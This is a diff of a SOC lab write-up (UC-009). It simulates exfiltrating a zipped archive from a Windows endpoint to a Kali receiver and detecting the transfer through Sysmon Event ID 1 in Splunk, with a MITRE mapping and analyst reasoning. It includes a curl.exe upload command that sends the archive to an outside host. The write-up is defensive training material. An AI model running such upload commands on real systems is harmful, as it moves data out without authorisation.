@@ -2,7 +2,7 @@
 
 ## 1. Overview
 
-This use case simulates the exfiltration of previously collected and archived data from a Windows endpoint to an external host within the isolated SOC laboratory.
+This use case simulates the exfiltration of previously collected and archived data from a Windows endpoint to a Kali Linux receiver inside the isolated SOC laboratory.
 
 During UC-008, test data was collected and compressed into the following archive:
 
@@ -10,15 +10,27 @@ During UC-008, test data was collected and compressed into the following archive
 C:\SOC-Lab\collection.zip
 ```
 
-In this scenario, the archive was transferred from the Windows 11 workstation (`target-pc`) to the Kali Linux machine using the native Windows `curl.exe` utility over HTTP.
+In UC-009, the same archive was transferred from the Windows 11 workstation (`target-pc`) to the Kali Linux machine using the native Windows `curl.exe` utility over unencrypted HTTP.
 
-The objective is to demonstrate how a SOC analyst can identify potential data exfiltration by analyzing endpoint process telemetry in Splunk.
+The objective is to demonstrate how a SOC analyst can identify potential data exfiltration by analyzing endpoint process telemetry in Splunk and correlating the activity with the preceding collection stage.
 
-> **Lab Safety:** All files used in this scenario contain dummy test data. The transfer was performed exclusively inside the isolated SOC laboratory network.
+> **Lab Safety:** All transferred files contain dummy test data. The transfer occurred exclusively inside the isolated SOC laboratory network.
 
 ---
 
-## 2. Environment
+## 2. MITRE ATT&CK Mapping
+
+| Tactic | Technique | ID |
+|---|---|---|
+| Exfiltration | Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol | T1048.003 |
+
+The scenario uses unencrypted HTTP over TCP port `8000` to transfer the previously archived data from `target-pc` to the Kali Linux receiver.
+
+Because the transfer uses an unencrypted protocol outside a command-and-control channel, the simulated behavior is mapped to **MITRE ATT&CK T1048.003 – Exfiltration Over Unencrypted Non-C2 Protocol**.
+
+---
+
+## 3. Environment
 
 | Component | Role | IP Address |
 |---|---|---|
@@ -41,9 +53,9 @@ Kali Linux
 
 ---
 
-## 3. Attack Scenario
+## 4. Attack Scenario
 
-The scenario assumes that data has already been collected and archived on the endpoint.
+The scenario assumes that data has already been collected and archived on the Windows endpoint during UC-008.
 
 The archive used for the simulation was:
 
@@ -57,33 +69,40 @@ The transfer was performed using the native Windows utility:
 C:\Windows\System32\curl.exe
 ```
 
-The destination was an HTTP service running on the Kali Linux machine:
+The destination was an HTTP receiver running on the Kali Linux machine:
 
 ```text
 10.0.10.250:8000
 ```
 
-The transfer command observed during the simulation was:
+The transfer command used during the simulation was:
 
 ```powershell
 curl.exe -T "C:\SOC-Lab\collection.zip" http://10.0.10.250:8000/
 ```
 
-This generated endpoint telemetry that could subsequently be investigated from Splunk.
+This operation represents the transfer of staged data from the monitored Windows endpoint to another system.
 
 ---
 
-## 4. Execution Evidence
+## 5. Execution Evidence
 
-The archive was transferred from `target-pc` to the Kali Linux receiver.
+### 5.1 HTTP Transfer from target-pc
 
-### Windows Transfer
-
-The following screenshot shows the execution of `curl.exe` from the Windows endpoint.
+The archive was transferred from the Windows endpoint using `curl.exe`.
 
 ![HTTP transfer using curl](../../screenshots/detections/UC-009-curl-transfer.png)
 
-### Kali Reception
+The command explicitly referenced:
+
+- The archive being transferred
+- The destination IP address
+- The destination port
+- The HTTP protocol
+
+---
+
+### 5.2 Archive Received on Kali
 
 The transferred archive was successfully received by the Kali Linux machine as:
 
@@ -91,7 +110,7 @@ The transferred archive was successfully received by the Kali Linux machine as:
 received_collection.zip
 ```
 
-The reception was verified using:
+The file was verified on the receiving system using:
 
 ```bash
 ls -lh received_collection.zip
@@ -99,13 +118,13 @@ ls -lh received_collection.zip
 
 ![Transferred archive received on Kali](../../screenshots/detections/UC-009-kali-received-file.png)
 
-This confirms that the simulated data transfer was successfully completed between the two laboratory systems.
+This confirms that the controlled data transfer between the two laboratory systems was completed successfully.
 
 ---
 
-## 5. Splunk Detection
+## 6. Splunk Detection
 
-The investigation focused on Sysmon Process Creation events generated on `target-pc`.
+The SOC investigation focused on Sysmon Process Creation telemetry generated on `target-pc`.
 
 The following Splunk query was used:
 
@@ -115,16 +134,18 @@ index=windows host="target-pc" EventCode=1 earliest=-1h Image="*\\curl.exe"
 | sort -_time
 ```
 
-The search returned a process creation event associated with:
+The search identified the execution of `curl.exe`.
+
+Observed telemetry included:
 
 ```text
-Process:
-C:\Windows\System32\curl.exe
-
 User:
 BADR\Administrator
 
-Parent Process:
+Image:
+C:\Windows\System32\curl.exe
+
+Parent Image:
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 
 Source File:
@@ -134,55 +155,45 @@ Destination:
 http://10.0.10.250:8000/
 ```
 
+### Detection Evidence
+
 ![Splunk detection of curl execution](../../screenshots/detections/UC-009-splunk-curl-event.png)
 
-The command line is particularly important because it provides direct visibility into both the local file being transferred and the remote destination.
+The command-line telemetry was particularly valuable because it exposed both the local archive and the remote destination in the same event.
 
 ---
 
-## 6. SOC Analysis – 5W1H
+## 7. SOC Analysis – 5W1H
 
 ### Who?
 
-The activity was executed under the following account:
+The activity was executed under:
 
 ```text
 BADR\Administrator
 ```
 
-This identifies the user context associated with the `curl.exe` process.
-
----
+This identifies the user context responsible for launching the transfer utility.
 
 ### What?
 
-A ZIP archive containing the previously collected test data was transferred from the Windows endpoint to another system.
-
-The transferred file was:
+The previously created archive:
 
 ```text
 C:\SOC-Lab\collection.zip
 ```
 
-The process responsible for the transfer was:
-
-```text
-curl.exe
-```
-
----
+was transferred from the Windows endpoint to another host using `curl.exe`.
 
 ### When?
 
-Splunk recorded the relevant Sysmon Process Creation event at approximately:
+The relevant Sysmon Process Creation event was observed in Splunk at approximately:
 
 ```text
 2026-08-17 19:18:34
 ```
 
-This timestamp can be used to correlate the transfer with preceding collection and archive activity.
-
----
+This timestamp can be used to correlate the transfer with preceding activity on the same endpoint.
 
 ### Where?
 
@@ -193,39 +204,39 @@ Host: target-pc
 IP: 10.0.10.20
 ```
 
-The destination used in the command line was:
+The remote destination specified in the command line was:
 
 ```text
 10.0.10.250:8000
 ```
 
-which corresponds to the Kali Linux system in the isolated SOC laboratory.
-
----
+which corresponds to the Kali Linux receiver in the isolated SOC laboratory.
 
 ### Why?
 
-From a SOC perspective, transferring an archive containing collected data to another host can represent data staging followed by potential exfiltration.
+From a SOC perspective, transferring an archive containing previously collected data to another host can represent data exfiltration.
 
-However, the execution of `curl.exe` is not automatically malicious. It is a legitimate Windows utility that may also be used for administrative or application-related network transfers.
+However, `curl.exe` is a legitimate Windows utility and its execution alone does not prove malicious activity.
 
-The activity becomes suspicious when contextual evidence is considered together:
+The context makes the event relevant because:
 
-- an archive containing collected data already existed;
+- collected data had previously been archived;
 - `curl.exe` was launched from PowerShell;
-- the command line explicitly referenced the archive;
-- the command line contained a remote destination;
-- the archive was subsequently observed on the receiving system.
-
-Therefore, the event requires contextual investigation rather than classification based solely on the process name.
-
----
+- the command line referenced the archive created during UC-008;
+- a remote HTTP destination was explicitly specified;
+- the archive was successfully received by another host.
 
 ### How?
 
-The transfer was performed using the native Windows `curl.exe` utility over HTTP.
+The transfer was performed using:
 
-The observed process chain was:
+```text
+curl.exe
+```
+
+over unencrypted HTTP.
+
+The observed execution chain was:
 
 ```text
 powershell.exe
@@ -233,133 +244,183 @@ powershell.exe
       v
 curl.exe
       |
-      | HTTP transfer
+      | HTTP / TCP 8000
       v
-10.0.10.250:8000
+10.0.10.250
 ```
 
-Sysmon Event ID 1 recorded the process execution and command-line arguments, and the event was forwarded to Splunk for analysis.
+Sysmon Event ID 1 captured the process execution and command-line arguments, which were then forwarded to Splunk.
 
 ---
 
-## 7. Event Correlation
+## 8. Correlation with UC-008
 
-This use case is directly related to UC-008.
+UC-009 is directly related to UC-008.
 
-The complete behavioral sequence observed across both use cases is:
+During UC-008, multiple dummy files were prepared and archived using `tar.exe`.
+
+The resulting archive was:
 
 ```text
-Test data
-    |
-    v
-C:\SOC-Lab\Collection
-    |
-    | UC-008
-    v
-tar.exe
-    |
-    v
 C:\SOC-Lab\collection.zip
-    |
-    | UC-009
-    v
+```
+
+UC-009 then transferred this same archive to the Kali Linux receiver.
+
+The combined sequence is:
+
+```text
+Dummy Test Data
+       |
+       v
+C:\SOC-Lab\Collection
+       |
+       | UC-008
+       v
+tar.exe
+       |
+       | T1560.001
+       v
+C:\SOC-Lab\collection.zip
+       |
+       | UC-009
+       v
 curl.exe
-    |
-    | HTTP
-    v
-10.0.10.250:8000
-    |
-    v
+       |
+       | HTTP / TCP 8000
+       | T1048.003
+       v
+Kali Linux
+10.0.10.250
+       |
+       v
 received_collection.zip
 ```
 
-Analyzing these activities together provides significantly more context than analyzing `tar.exe` or `curl.exe` independently.
+This correlation provides stronger context than investigating `tar.exe` or `curl.exe` independently.
 
-A legitimate archive utility followed by a legitimate network transfer utility can become suspicious when both processes operate on the same collected dataset within a short period.
+A legitimate archive utility followed by a legitimate transfer utility can become suspicious when both processes operate on the same dataset within the same activity chain.
 
 ---
 
-## 8. Analyst Interpretation
+## 9. Detection Logic
 
-The execution of `curl.exe` alone is insufficient to classify the activity as malicious.
+The primary detection is based on Sysmon Process Creation telemetry.
 
-A SOC analyst should examine additional context such as:
+A basic Splunk detection query can identify `curl.exe` executions containing file-transfer arguments and HTTP destinations:
 
-- the user executing the process;
-- the parent process;
-- the complete command line;
-- the file being accessed;
-- the destination address;
-- previous activity involving the same file;
-- whether the destination is expected or authorized.
-
-In this case, the command-line telemetry provided strong contextual evidence because it exposed:
-
-```text
-curl.exe
-        ↓
-C:\SOC-Lab\collection.zip
-        ↓
-HTTP
-        ↓
-10.0.10.250:8000
+```spl
+index=windows EventCode=1 Image="*\\curl.exe"
+| table _time host User Image ParentImage CommandLine
+| sort -_time
 ```
 
-Combined with the archive creation activity observed during UC-008, this behavior represents a simulated data exfiltration chain inside the laboratory.
+The analyst should then examine the command line for indicators such as:
+
+- A local file being transferred
+- A remote IP address or hostname
+- HTTP or another network protocol
+- Unusual destination ports
+- Archives such as `.zip`
+- Execution from scripting environments such as PowerShell
+
+The detection should not automatically classify every `curl.exe` execution as malicious.
+
+Context and correlation are required.
 
 ---
 
-## 9. Telemetry Limitation
+## 10. Analyst Interpretation
 
-A search was also performed for Sysmon Network Connection events (`EventCode=3`) associated with `curl.exe` and the destination `10.0.10.250:8000`.
+The execution of `curl.exe` alone is insufficient to classify activity as data exfiltration.
 
-No corresponding Event ID 3 event was observed in Splunk during the investigation.
+A SOC analyst should evaluate:
 
-Therefore, this use case does **not** claim network detection through Sysmon Event ID 3.
+- User account
+- Source endpoint
+- Parent process
+- Complete command line
+- File being transferred
+- Destination address
+- Destination port
+- Previous activity involving the same file
+- Whether the destination is expected or authorized
 
-The primary SIEM evidence used for the investigation was:
+In this scenario, the following sequence increased the relevance of the event:
+
+```text
+Archive created during UC-008
+             |
+             v
+C:\SOC-Lab\collection.zip
+             |
+             v
+curl.exe executed
+             |
+             v
+Archive referenced in CommandLine
+             |
+             v
+Remote destination 10.0.10.250:8000
+             |
+             v
+Archive received by Kali
+```
+
+This contextual correlation is more valuable than relying only on the name of the executed process.
+
+---
+
+## 11. Telemetry Limitation
+
+Sysmon Network Connection telemetry was also investigated.
+
+The following type of search was performed for Event ID 3:
+
+```spl
+index=windows host="target-pc" EventCode=3 earliest=-2h Image="*\\curl.exe"
+| table _time User Image SourceIp SourcePort DestinationIp DestinationPort Protocol
+| sort -_time
+```
+
+No corresponding Sysmon Event ID 3 event was observed in Splunk.
+
+Therefore, this use case does **not** claim that the HTTP transfer was detected through Sysmon Network Connection telemetry.
+
+The verified SIEM evidence is based on:
 
 ```text
 Sysmon Event ID 1 – Process Creation
 ```
 
-The process event still exposed the destination address and port because they were present directly in the `curl.exe` command line.
-
-This represents an important monitoring lesson: detection capability depends on the telemetry that is actually available to the SIEM, and analysts should distinguish between observed evidence and expected telemetry.
-
----
-
-## 10. MITRE ATT&CK Context
-
-This scenario represents data being transferred from a compromised endpoint to another system using an application-layer network protocol.
-
-The precise MITRE ATT&CK sub-technique should be selected according to the protocol and exfiltration behavior represented by the final scenario.
-
-The laboratory demonstrates the general exfiltration phase through:
+Fortunately, the complete `curl.exe` command line contained:
 
 ```text
-Archive preparation
-        ↓
-Transfer utility execution
-        ↓
-HTTP communication
-        ↓
-Remote data reception
+C:\SOC-Lab\collection.zip
 ```
 
-The ATT&CK mapping should therefore be interpreted together with the preceding archive activity documented in UC-008.
+and:
+
+```text
+http://10.0.10.250:8000/
+```
+
+which provided visibility into the file and destination despite the absence of Event ID 3.
+
+This demonstrates an important SOC principle:
+
+> The absence of expected telemetry does not necessarily mean that the activity did not occur. Detection conclusions must be based on the telemetry that was actually collected and verified.
 
 ---
 
-## 11. Detection Result
+## 12. Detection Result
 
 The simulated exfiltration activity was successfully identified in Splunk through Sysmon Process Creation telemetry.
-
-### Key Evidence
 
 | Field | Observed Value |
 |---|---|
 | Host | `target-pc` |
+| Source IP | `10.0.10.20` |
 | User | `BADR\Administrator` |
 | Process | `C:\Windows\System32\curl.exe` |
 | Parent Process | `powershell.exe` |
@@ -368,48 +429,59 @@ The simulated exfiltration activity was successfully identified in Splunk throug
 | Destination Port | `8000` |
 | Protocol | HTTP |
 | Sysmon Event | Event ID `1` |
+| MITRE ATT&CK | `T1048.003` |
 
-The most valuable field during the investigation was the command line:
-
-```text
-"C:\WINDOWS\system32\curl.exe" -T C:\SOC-Lab\collection.zip http://10.0.10.250:8000/
-```
-
-It revealed the executable, transferred file, remote destination, port, and protocol within a single process event.
+The command line provided the most valuable evidence because it revealed the transfer utility, local archive, remote destination, port, and protocol.
 
 ---
 
-## 12. Key Learning
+## 13. Key Learning
 
-This use case demonstrates that data exfiltration detection should not depend exclusively on identifying a specific executable.
+This use case demonstrates that legitimate system utilities can be used during suspicious activity.
 
-Legitimate utilities such as:
+Neither:
 
 ```text
-curl.exe
-powershell.exe
 tar.exe
 ```
 
-can be used during normal administrative operations.
+nor:
 
-The SOC analyst therefore needs to analyze the **behavior and context** surrounding their execution.
+```text
+curl.exe
+```
 
-In this scenario, correlation between archive creation in UC-008 and the subsequent HTTP transfer in UC-009 provided stronger evidence than either event analyzed independently.
+is inherently malicious.
 
-The investigation also demonstrated the importance of documenting telemetry limitations. Although a Sysmon Network Connection event was expected, it was not observed in Splunk. The analysis therefore relied only on evidence that was actually collected and verified.
+The analyst must investigate the behavior surrounding these processes.
+
+UC-008 and UC-009 demonstrate how separate endpoint events can be correlated into a more meaningful sequence:
+
+```text
+Collection
+    ↓
+Archive
+    ↓
+Transfer
+    ↓
+Potential Exfiltration
+```
+
+The use case also highlights the importance of telemetry coverage. Although the process execution was successfully captured, the expected Sysmon network event was not observed.
+
+Understanding these visibility gaps is an important part of SOC monitoring and detection engineering.
 
 ---
 
-## 13. Conclusion
+## 14. Conclusion
 
-UC-009 successfully demonstrated a controlled data exfiltration scenario inside the isolated SOC laboratory.
+UC-009 successfully demonstrated a controlled HTTP data exfiltration scenario inside the isolated SOC laboratory.
 
-A previously created archive was transferred from the Windows endpoint to a Kali Linux receiver using `curl.exe` over HTTP.
+The archive created during UC-008 was transferred from `target-pc` (`10.0.10.20`) to the Kali Linux receiver (`10.0.10.250`) using the native Windows `curl.exe` utility over HTTP on TCP port `8000`.
 
-Sysmon captured the execution through Event ID 1, and Splunk provided visibility into the process, user, parent process, source archive, and remote destination.
+Sysmon Event ID 1 captured the process execution, and Splunk provided visibility into the user, parent process, source archive, and remote destination through command-line telemetry.
 
-When correlated with UC-008, the activity forms a complete simulated sequence:
+When correlated with UC-008, the two use cases form a continuous simulated attack sequence:
 
 ```text
 Data Collection
@@ -421,4 +493,6 @@ HTTP Transfer
 Remote Reception
 ```
 
-This use case demonstrates how endpoint telemetry and contextual correlation can help a SOC analyst identify potentially suspicious data-transfer behavior while avoiding the assumption that legitimate administrative tools are inherently malicious.
+The observed exfiltration behavior is mapped to **MITRE ATT&CK T1048.003 – Exfiltration Over Unencrypted Non-C2 Protocol**.
+
+This use case demonstrates the importance of process telemetry, command-line analysis, behavioral correlation, and contextual investigation when detecting potential data exfiltration.
